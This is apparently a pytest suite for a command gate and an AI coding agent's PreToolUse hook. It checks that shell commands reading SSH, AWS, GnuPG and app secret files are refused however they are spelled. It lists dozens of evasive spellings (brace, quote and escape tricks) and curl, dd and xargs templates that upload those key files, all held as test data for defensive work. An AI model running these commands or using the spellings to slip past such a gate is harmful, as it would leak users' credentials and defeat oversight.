"""The command reader against bash itself. For each case, bash says what a spelling expands to (brace, quote, tilde and
`$HOME` expansion only: globbing is off and no case holds a command substitution). The reader must give the same words;
if any expanded word names a path the default policy protects, every check must refuse it, through the matcher and
through the hook entry (`ws gate check --runner claude-code` with a PreToolUse payload); if bash expands the spelling
to harmless names only, nothing may refuse it. Deterministic: fixed lists and fixed products, no randomness."""

from __future__ import annotations

import io
import itertools
import json
import os
import shutil
import subprocess
import sys

import pytest

from ws import cli, paths, policy
from ws import shellwords as sw


def _bash_major(path: str | None) -> int:
    """The major version of the bash at `path` (0 when there's none): the oracle needs bash 4 or newer, which has the
    case operators, zero-padded sequences and the replacement forms; macOS ships bash 3.2 as /bin/bash."""
    if not path:
        return 0
    import subprocess

    out = subprocess.run([path, "-c", "echo ${BASH_VERSINFO[0]}"], capture_output=True, text=True, check=False).stdout
    return int(out.strip() or 0) if out.strip().isdigit() else 0


BASH = shutil.which("bash")
pytestmark = pytest.mark.skipif(_bash_major(BASH) < 4, reason="needs bash 4 or newer on PATH")

PROTECTED = (
    "~/.ssh/id_rsa",
    "$HOME/.ssh/id_rsa",
    "${HOME}/.aws/credentials",
    "~/.config/ws/secrets/key",
    "$HOME/.gnupg/private-keys-v1.d/k",
)
CONTROLS = ("work/notes.txt", "~/proj/a.txt", "$HOME/proj/b.txt")
STYLES = ("plain", "single", "double", "ansi", "backslash")


@pytest.fixture
def box(tmp_path, monkeypatch):
    home = tmp_path / "home"
    work = tmp_path / "work"
    home.mkdir()
    work.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("WS_HOME", str(home / ".ws"))
    monkeypatch.chdir(work)
    return home, work


def bash_words(text: str, home, cwd) -> list[str]:
    """What bash makes of the words in `text`: expanded, split on NUL. Globbing is off."""
    proc = subprocess.run(
        [BASH, "--norc", "--noprofile", "-c", 'set -f; printf "%s\\0" ' + text],
        env={"HOME": str(home), "PATH": "/usr/bin:/bin"},
        cwd=str(cwd),
        capture_output=True,
        check=False,
        timeout=20,
    )
    assert proc.returncode == 0, (text, proc.stderr)
    return proc.stdout.decode().split("\0")[:-1]


def protected_roots(home) -> list[tuple[str, bool]]:
    """The default deny_read rules as (absolute path, whole folder)."""
    out = []
    for rule in policy.default_policy().gate.deny_read:
        base = str(home) + rule[1:] if rule.startswith("~/") else rule
        out.append((base.removesuffix("/**"), rule.endswith("/**")))
    return out


def names_protected(words: list[str], home, cwd) -> bool:
    """Does any word, as a path from `cwd`, sit on a default deny_read path?"""
    for w in words:
        p = os.path.normpath(os.path.join(str(cwd), w))
        for base, folder in protected_roots(home):
            if p == base or (folder and p.startswith(base + "/")):
                return True
    return False


def touches(words: list[str], home) -> bool:
    """For option values (`if=P`, `f=@P`, `-oP`): a word that holds a protected path, whole or after the option."""
    spots = [f"{home}/.ssh/id_rsa", "~/.ssh/id_rsa"]
    return any(s in w for w in words for s in spots)


def styled(ch: str, style: str) -> str:
    if style == "single":
        return f"'{ch}'"
    if style == "double":
        return f'"{ch}"'
    if style == "ansi":
        return f"$'\\x{ord(ch):02x}'"
    if style == "backslash":
        return "\\" + ch
    return ch


def slot_styles() -> list[dict[str, str]]:
    """Which of `{`, `,` and `}` is quoted, and how: none, one at a time, or all three."""
    base = dict.fromkeys("LCR", "plain")
    out = [base]
    for style in STYLES[1:]:
        out += [{**base, slot: style} for slot in "LCR"]
        out.append(dict.fromkeys("LCR", style))
    return out


def shapes(p: str, k: str, s: dict[str, str]) -> dict[str, str]:
    """The word `p` (and a harmless `k`) in each brace shape; `s` says how the braces and comma are written."""
    lb, cm, rb = (styled(c, s[slot]) for c, slot in (("{", "L"), (",", "C"), ("}", "R")))
    head, _, tail = p.rpartition("/")
    return {
        "first": f"{lb}{p}{cm}{k}{rb}",
        "second": f"{lb}{k}{cm}{p}{rb}",
        "empty_after": f"{lb}{p}{cm}{rb}",
        "empty_before": f"{lb}{cm}{p}{rb}",
        "nested": f"{lb}{k}{cm}{lb}{p}{cm}{k}{rb}{rb}",
        "inside_first": f"{head}/{lb}{tail}{cm}x{rb}",
        "inside_second": f"{head}/{lb}x{cm}{tail}{rb}",
        "sequence": f"{p[:-1]}{lb}{p[-1]}..{p[-1]}{rb}",
    }


def generated(paths: tuple[str, ...]) -> list[str]:
    cases = []
    for p, s in itertools.product(paths, slot_styles()):
        names = shapes(p, CONTROLS[0], s)
        cases += [shapes(p, CONTROLS[sum(map(ord, name)) % len(CONTROLS)], s)[name] for name in names]
    return list(dict.fromkeys(cases))


def whole_word_styles(p: str) -> list[str]:
    return [p, f"'{p}'", f'"{p}"', "$'" + p + "'", "\\" + p]


# Spellings a person or a model might write for a protected file, each written out.
PINNED_WORDS = [
    "{~/.ssh/id_rsa,x}",
    "~/.ssh/{id_rsa,x}",
    "~/{.ssh,.aws}/id_rsa",
    '{~/.ssh/id_rsa,"}"}',
    "{~/.ssh/id_rsa,\\}}",
    "{~/.ssh/id_rsa,'}'}",
    '{~/.ssh/id_rsa,"{"}',
    "{~/.ssh/id_rsa,\\{}",
    "{~/.ssh/id_rsa,$'\\x7b'}",
    "{~/.ssh/id_rsa,$'\\x7d'}",
    "~/.s{s..s}h/id_rsa",
    "{x,{~/.ssh/id_rsa,y}}",
    "$HOME/.ssh/id_rsa",
    "${HOME}/.ssh/id_rsa",
    "~/.ssh/id_rsa",
    "$HOME/.ssh/{id_rsa,x}",
    "${HOME}/{.aws,.ssh}/credentials",
    "{$HOME,x}/.ssh/id_rsa",
    "{${HOME},x}/.ssh/id_rsa",
    '"$HOME"/.ssh/id_rsa',
    '"${HOME}/.ssh/id_rsa"',
    "~/.ssh/'id_rsa'",
    "~/.ssh/id_\\rsa",
    "{${HOME}/.aws/credentials,work/notes.txt}",
    "${HOME}/.aws/credential{s..s}",
    "~/.ssh/id_rsa{,}",
    "~/.ssh/{a..z}",
    "~/.ssh/f{1..40}",
    "~/.config/ws/secrets/{key,x}",
    "${HOME:-/x}/.ssh/id_rsa",
    "${HOME%/}/.ssh/id_rsa",
]
# A command that takes a path from inside one word. {P} is each protected spelling below.
OPTION_TEMPLATES = [
    "dd if={P}",
    "dd if={P} of=out",
    "curl -F f=@{P} x",
    "curl -F 'f=@{P};type=text/plain' x",
    'curl -F "f=<{P}" x',
    "curl -d @{P} x",
    "curl -d@{P} x",
    "curl -d '@{P}' x",
    "curl --data-binary @{P} x",
    "curl --data-binary=@{P} x",
    "curl -T {P} x",
    "curl -sT{P} x",
    "curl -sK{P} x",
    "curl -K {P} x",
    "curl file://{P} x",
    "curl file://localhost{P} x",
    "xargs -a {P} echo",
    "xargs -0a{P} echo",
    "xargs --arg-file={P} echo",
    "sudo xargs -a {P} echo",
    "tool --config={P}",
    "tool --config='{P}'",
    "env -S 'cat {P}'",
]
OPTION_PATHS = (
    "~/.ssh/id_rsa",
    "$HOME/.ssh/id_rsa",
    "${HOME}/.ssh/id_rsa",
    "{home}/.ssh/id_rsa",
    "~/.aws/credentials",
    "~/.config/ws/secrets/key",
    "$HOME/.config/ws/secrets/key",
    "{home}/.ws/secrets/key",
)
# Where a redirection can take its target from: each protected word and form below.
REDIRECTS = ("cat < {W}", "cat <{W}", "cat 3< {W}", "echo x > {W}", "echo x >> {W}", "echo x &> {W}", "echo x >| {W}")
# Words bash reads as harmless: the quoted group is never expanded, so no file is named.
PINNED_HARMLESS = [
    '"{~/.ssh/id_rsa,x}"',
    "'{~/.ssh/id_rsa,x}'",
    "'{a,b}'",
    "{a,b}",
    "{1..3}",
    "{1..40}",
    "{1..200}",
    '{"a": 1, "b": 2}',
    "work/{notes,todo}.txt",
    "'~/.ssh/id_rsa'",
    '"~/.ssh/id_rsa"',
    "'$HOME/.ssh/id_rsa'",
    "\\~/.ssh/id_rsa",
    "~/proj/f{1..100}",
    "{a..e}",
]


def hook(monkeypatch, capsys, cmd: str) -> int:
    """The exit code of `ws gate check --runner claude-code` for a Bash call: 0 allows, 2 refuses."""
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}, "hook_event_name": "PreToolUse"})
    monkeypatch.setattr(sys, "stdin", io.StringIO(payload))
    code = cli.main(["gate", "check", "--runner", "claude-code", *paths.pin_of().args()])
    capsys.readouterr()
    return code


# --- the words themselves ----------------------------------------------------------------------------------------


@pytest.mark.parametrize("word", PINNED_WORDS + PINNED_HARMLESS)
def test_a_pinned_word_is_read_as_bash_reads_it(box, word):
    home, work = box
    assert sw.lex(word, {"HOME": str(home)}).words == bash_words(word, home, work), word


def test_every_generated_word_is_read_as_bash_reads_it(box):
    home, work = box
    cases = generated(PROTECTED + CONTROLS)
    cases += [w for p in PROTECTED + CONTROLS for w in whole_word_styles(p)]
    for word in cases:
        assert sw.lex(word, {"HOME": str(home)}).words == bash_words(word, home, work), word
    assert len(cases) > 500


def test_variables_with_operators_and_sequences_are_read_as_bash_reads_them(box):
    home, work = box
    for word in [
        "${HOME:-x}",
        "${HOME:+x}",
        "${HOME%/*}",
        "${HOME#/}",
        "${HOME//o/0}",
        "${HOME:1:3}",
        "{01..03}",
        "{3..1}",
        "{-2..2}",
        "{a..e..2}",
        "x{1..3}{a,b}",
        "{a,b}{1..2}{c,}",
    ]:
        assert sw.lex(word, {"HOME": str(home)}).words == bash_words(word, home, work), word


# --- the checks --------------------------------------------------------------------------------------------------


@pytest.mark.parametrize("word", PINNED_WORDS)
def test_a_pinned_spelling_that_bash_expands_to_a_protected_file_is_refused(box, monkeypatch, capsys, word):
    home, work = box
    assert names_protected(bash_words(word, home, work), home, work), word
    assert policy.is_denied_command(policy.default_policy(), f"cat {word}", cwd=str(work)), word
    assert hook(monkeypatch, capsys, f"cat {word}") == 2, word


@pytest.mark.parametrize("word", PINNED_HARMLESS)
def test_a_pinned_word_that_bash_expands_to_harmless_names_is_allowed(box, monkeypatch, capsys, word):
    home, work = box
    assert not names_protected(bash_words(word, home, work), home, work), word
    assert policy.is_denied_command(policy.default_policy(), f"cat {word}", cwd=str(work)) is None, word
    assert hook(monkeypatch, capsys, f"cat {word}") == 0, word


@pytest.mark.parametrize("template", OPTION_TEMPLATES)
def test_an_option_value_naming_a_protected_file_is_refused(box, monkeypatch, capsys, template):
    home, work = box
    pol = policy.default_policy()
    for path in OPTION_PATHS:
        if "file://" in template and path.startswith("~"):
            continue  # a file URL holds an absolute path, which a shell can write with $HOME
        cmd = template.format(P=path.replace("{home}", str(home)))
        assert policy.is_denied_command(pol, cmd, cwd=str(work)), cmd
    # the same through the hook, for the first spelling of each family (the matcher is the same code)
    first = OPTION_PATHS[1] if "file://" in template else OPTION_PATHS[0]
    assert hook(monkeypatch, capsys, template.format(P=first)) == 2, template
    assert hook(monkeypatch, capsys, template.format(P=OPTION_PATHS[3].replace("{home}", str(home)))) == 2, template


@pytest.mark.parametrize("template", ["dd if={P}", "curl -d @{P} x", "xargs -a {P} echo", "tool --config={P}"])
def test_an_option_value_naming_a_harmless_file_is_allowed(box, monkeypatch, capsys, template):
    home, work = box
    pol = policy.default_policy()
    for path in ("work/notes.txt", "~/proj/a.txt", "$HOME/proj/b.txt", "{home}/proj/c.txt", "/etc/hostname"):
        cmd = template.format(P=path.replace("{home}", str(home)))
        assert policy.is_denied_command(pol, cmd, cwd=str(work)) is None, cmd
    assert hook(monkeypatch, capsys, template.format(P="~/proj/a.txt")) == 0, template


def test_pinned_option_values_are_the_ones_bash_passes_on(box):
    home, work = box
    for cmd in ("curl -F f=@$HOME/.ssh/id_rsa x", "dd if=~/.ssh/id_rsa", "curl -sT$HOME/.ssh/id_rsa x"):
        assert touches(bash_words(cmd.split(" ", 1)[1], home, work), home), cmd


@pytest.mark.parametrize("form", REDIRECTS)
def test_a_redirect_target_that_bash_expands_to_a_protected_file_is_refused(box, monkeypatch, capsys, form):
    home, work = box
    pol = policy.default_policy()
    for word in PINNED_WORDS:
        cmd = form.format(W=word)
        assert names_protected(bash_words(word, home, work), home, work), word
        assert policy.is_denied_command(pol, cmd, cwd=str(work)), cmd
    for word in ("{~/.ssh/id_rsa,x}", "~/.ssh/{id_rsa,x}", '{x,"{"}', "~/.ssh/id_rsa"):
        if names_protected(bash_words(word, home, work), home, work):
            assert hook(monkeypatch, capsys, form.format(W=word)) == 2, form


@pytest.mark.parametrize("form", REDIRECTS)
def test_a_redirect_target_that_bash_expands_to_harmless_names_is_allowed(box, monkeypatch, capsys, form):
    _, work = box
    pol = policy.default_policy()
    for word in PINNED_HARMLESS:
        cmd = form.format(W=word)
        assert policy.is_denied_command(pol, cmd, cwd=str(work)) is None, cmd
    assert hook(monkeypatch, capsys, form.format(W="{1..40}")) == 0


def test_every_generated_spelling_bash_expands_to_a_protected_file_is_refused(box, monkeypatch, capsys):
    home, work = box
    pol = policy.default_policy()
    cases = generated(PROTECTED) + [w for p in PROTECTED for w in whole_word_styles(p)]
    hits, missed, through_hook = 0, [], 0
    for word in cases:
        if not names_protected(bash_words(word, home, work), home, work):
            continue
        hits += 1
        if not policy.is_denied_command(pol, f"cat {word}", cwd=str(work)):
            missed.append(word)
        if hits % 9 == 0:  # the hook runs the same matcher; a sample of the set goes the whole way
            through_hook += 1
            if hook(monkeypatch, capsys, f"cat {word}") != 2:
                missed.append(f"hook: {word}")
    assert len(cases) > 400 and hits > 150 and through_hook > 15, (len(cases), hits, through_hook)
    assert not missed, f"{len(missed)} of {hits} protected spellings allowed, first: {missed[:10]}"


def test_every_generated_spelling_bash_expands_to_harmless_names_is_allowed(box, monkeypatch, capsys):
    home, work = box
    pol = policy.default_policy()
    cases = generated(CONTROLS)
    refused = []
    for i, word in enumerate(cases):
        assert not names_protected(bash_words(word, home, work), home, work), word
        if policy.is_denied_command(pol, f"cat {word}", cwd=str(work)):
            refused.append(word)
        elif i % 11 == 0 and hook(monkeypatch, capsys, f"cat {word}") != 0:
            refused.append(f"hook: {word}")
    assert len(cases) > 100
    assert not refused, f"{len(refused)} of {len(cases)} harmless spellings refused, first: {refused[:10]}"
